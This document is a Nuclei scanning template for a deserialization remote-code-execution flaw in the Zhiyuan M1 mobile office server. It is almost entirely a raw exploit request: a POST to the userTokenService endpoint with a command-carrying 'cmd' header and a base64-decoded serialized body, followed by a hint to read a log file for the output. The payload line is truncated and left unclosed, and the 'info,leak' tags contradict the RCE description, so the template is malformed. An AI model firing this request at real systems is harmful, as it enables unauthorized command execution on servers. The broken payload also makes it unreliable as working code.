id: zhiyuanOA-M1-usertokenservice-rce
info:
  name: 致远M1 usertokenservice 反序列化RCE漏洞
  author: cnaq
  severity: high  
  description: 致远M1 usertokenservice 反序列化RCE漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9CM1%20usertokenservice%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E.md
  tags: zhiyuanOA,info,leak

requests:
  - raw:
      - |
        POST /esn_mobile_pns/service/userTokenService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Content-Type: application/x-www-form-urlencoded
        cmd: @@@@@echo test

        {{base64_decode("

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - 'test'

# 然后再 Get 访问/mobile_portal/api/systemLog/pns/loadLog/app.log